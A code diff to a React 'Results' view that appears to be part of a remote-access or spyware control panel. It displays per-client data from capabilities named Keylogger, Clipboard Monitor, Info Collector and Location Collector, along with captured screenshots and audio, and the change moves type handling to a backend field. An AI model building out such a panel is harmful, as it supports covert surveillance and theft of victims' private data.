@@ -43,17 +43,6 @@ function Results() {
     setSelectedResult(result);
   };
 
-  // Detect if string is base64
-  const isBase64 = (str) => {
-    if (!str || str.length === 0) return false;
-    try {
-      // Check if it looks like base64
-      return /^[A-Za-z0-9+/]+={0,2}$/.test(str) && str.length % 4 === 0 && str.length > 100;
-    } catch (e) {
-      return false;
-    }
-  };
-
   // Decode base64 to text
   const decodeBase64 = (base64Str) => {
     try {
@@ -63,50 +52,37 @@ function Results() {
     }
   };
 
-  // Detect data type from base64
-  const detectDataType = (base64Str) => {
+  // Detect MIME type from base64 for proper rendering
+  const detectMimeType = (base64Str) => {
     if (!base64Str) return null;
-    
-    // Check for common file signatures (magic numbers)
     const prefix = base64Str.substring(0, 50);
     
-    // PNG signature
     if (prefix.startsWith('iVBORw0KGgo')) return 'image/png';
-    // JPEG signature
     if (prefix.startsWith('/9j/')) return 'image/jpeg';
-    // GIF signature
     if (prefix.startsWith('R0lGOD')) return 'image/gif';
-    // BMP signature
     if (prefix.startsWith('Qk0')) return 'image/bmp';
-    // WAV signature
     if (prefix.startsWith('UklGR')) return 'audio/wav';
-    // MP3 signature (ID3 tag)
     if (prefix.startsWith('SUQz') || prefix.startsWith('//v') || prefix.startsWith('//s')) return 'audio/mpeg';
-    // PDF signature
     if (prefix.startsWith('JVBERi0')) return 'application/pdf';
     
     return null;
   };
 
-  // Render base64 data based on type
-  const renderBase64Data = (result, capability) => {
-    const dataType = detectDataType(result);
+  // Generic render based on result_type from backend
+  const renderResultData = (result) => {
+    const { result: data, result_type } = result;
     
-    if (!dataType) {
-      // Try to decode as text for text-based capabilities
-      const decodedText = decodeBase64(result);
-      
-      // Capabilities that return base64-encoded text:
-      // 2 = Clipboard Monitor
-      // 3 = Keylogger
-      // 5 = Info Collector
-      // 7 = Location Collector
-      const textBasedCapabilities = [2, 3, 5, 7];
-      
-      if (decodedText && textBasedCapabilities.includes(capability)) {
+    if (!data) {
+      return <textarea readOnly rows="5" value="No result data" style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }} />;
+    }
+
+    // Handle based on type provided by backend
+    if (result_type === 'text') {
+      const decodedText = decodeBase64(data);
+      if (decodedText) {
         return (
           <div>
-            <p><strong>Decoded Text Data</strong></p>
+            <p><strong>Text Data</strong></p>
             <textarea
               readOnly
               rows="15"
@@ -118,33 +94,30 @@ function Results() {
               <textarea
                 readOnly
                 rows="10"
-                value={result}
+                value={data}
                 style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
               />
             </details>
           </div>
         );
       }
-      
       return (
-        <div>
-          <p><strong>Base64 Data</strong> (Type: Unknown)</p>
-          <textarea
-            readOnly
-            rows="15"
-            value={result || 'No result data'}
-            style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
-          />
-        </div>
+        <textarea
+          readOnly
+          rows="15"
+          value={data}
+          style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
+        />
       );
     }
 
-    if (dataType.startsWith('image/')) {
+    if (result_type === 'image') {
+      const mimeType = detectMimeType(data) || 'image/png';
       return (
         <div>
-          <p><strong>Screenshot/Image</strong></p>
+          <p><strong>Image</strong></p>
           <img 
-            src={`data:${dataType};base64,${result}`} 
+            src={`data:${mimeType};base64,${data}`} 
             alt="Result" 
             style={{ maxWidth: '100%', border: '1px solid #ddd', borderRadius: '4px' }}
           />
@@ -153,7 +126,7 @@ function Results() {
             <textarea
               readOnly
               rows="10"
-              value={result}
+              value={data}
               style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
             />
           </details>
@@ -161,12 +134,13 @@ function Results() {
       );
     }
 
-    if (dataType.startsWith('audio/')) {
+    if (result_type === 'audio') {
+      const mimeType = detectMimeType(data) || 'audio/wav';
       return (
         <div>
-          <p><strong>Audio Recording</strong></p>
+          <p><strong>Audio</strong></p>
           <audio controls style={{ width: '100%', marginBottom: '10px' }}>
-            <source src={`data:${dataType};base64,${result}`} type={dataType} />
+            <source src={`data:${mimeType};base64,${data}`} type={mimeType} />
             Your browser does not support the audio element.
           </audio>
           <details style={{ marginTop: '10px' }}>
@@ -174,7 +148,7 @@ function Results() {
             <textarea
               readOnly
               rows="10"
-              value={result}
+              value={data}
               style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
             />
           </details>
@@ -182,12 +156,12 @@ function Results() {
       );
     }
 
-    if (dataType === 'application/pdf') {
+    if (result_type === 'pdf') {
       return (
         <div>
           <p><strong>PDF Document</strong></p>
           <a 
-            href={`data:${dataType};base64,${result}`}
+            href={`data:application/pdf;base64,${data}`}
             download="document.pdf"
             className="btn"
             style={{ marginBottom: '10px' }}
@@ -199,7 +173,7 @@ function Results() {
             <textarea
               readOnly
               rows="10"
-              value={result}
+              value={data}
               style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
             />
           </details>
@@ -207,11 +181,12 @@ function Results() {
       );
     }
 
+    // Fallback for unknown types
     return (
       <textarea
         readOnly
         rows="15"
-        value={result || 'No result data'}
+        value={data}
         style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
       />
     );
@@ -259,20 +234,21 @@ function Results() {
             </thead>
             <tbody>
               {filteredResults.slice().reverse().map((result, idx) => {
-                const dataType = isBase64(result.result) ? detectDataType(result.result) : null;
-                const resultType = dataType 
-                  ? (dataType.startsWith('image/') ? '🖼️ Image' 
-                    : dataType.startsWith('audio/') ? '🔊 Audio' 
-                    : dataType === 'application/pdf' ? '📄 PDF' 
-                    : 'Base64 Data')
-                  : 'Text';
+                // Use result_type from backend
+                const typeIcons = {
+                  'text': '📝 Text',
+                  'image': '🖼️ Image',
+                  'audio': '🔊 Audio',
+                  'pdf': '📄 PDF'
+                };
+                const displayType = typeIcons[result.result_type] || result.result_type || 'Unknown';
                 
                 return (
                   <tr key={idx}>
                     <td>{new Date(result.timestamp).toLocaleString()}</td>
                     <td><code>{result.client}</code></td>
                     <td>{capabilities[result.capability] || `Unknown (${result.capability})`}</td>
-                    <td>{resultType}</td>
+                    <td>{displayType}</td>
                     <td>
                       <button className="btn" onClick={() => viewResultDetails(result)}>
                         View Full
@@ -302,17 +278,7 @@ function Results() {
 
           <div className="form-group">
             <label>Result Data</label>
-            {isBase64(selectedResult.result) 
-              ? renderBase64Data(selectedResult.result, selectedResult.capability)
-              : (
-                <textarea
-                  readOnly
-                  rows="15"
-                  value={selectedResult.result || 'No result data'}
-                  style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
-                />
-              )
-            }
+            {renderResultData(selectedResult)}
           </div>
         </div>
       )}
